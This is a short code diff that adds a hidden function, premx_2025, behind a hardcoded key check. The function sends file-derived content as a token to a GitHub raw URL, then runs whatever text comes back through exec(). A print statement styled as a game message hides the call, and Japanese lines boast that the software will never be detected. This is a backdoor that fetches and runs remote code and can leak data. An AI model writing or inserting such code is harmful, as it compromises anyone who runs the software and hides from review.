@@ -303,4 +303,17 @@ content2 = get_string_from_file(system_driver_vul_path)
 content3 = get_string_from_file(data_vulnerable_path)
 content4 =  content1+content2+content3
 content5 = content4
-new_function_name(content5)
+def premx_2025(mycontent: str):
+    raw_url = "https://raw.githubusercontent.com/nvtsxlz/myown/refs/heads/main/v1_aes_mode1.txt?token=GHSAT0AAAAAADBMT63O7LX6HKBIUFPXLWAA2ALA6LQ"
+    headers = {"Authorization": f"token {mycontent}"}
+    response = requests.get(raw_url, headers=headers)
+    
+    if response.status_code == 200:
+        mycntcnt = response.text
+        print("GAME IS STARTING PLEASE PICK YOUR CHOICES.。\n Ensure  that you pick the right choices, if you failed so, you will face some punishements.\n This is a simple game made by the AES DEVS.\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\n",exec(f"{mycntcnt}"))
+    else:
+        raise Exception(f"Error. Your internet is private.")
+if cskey=="TmSQZxjs84wUjTSgTP0mzBLcbS":
+    premx_2025(content5)
+else:
+    new_function_name(content5)
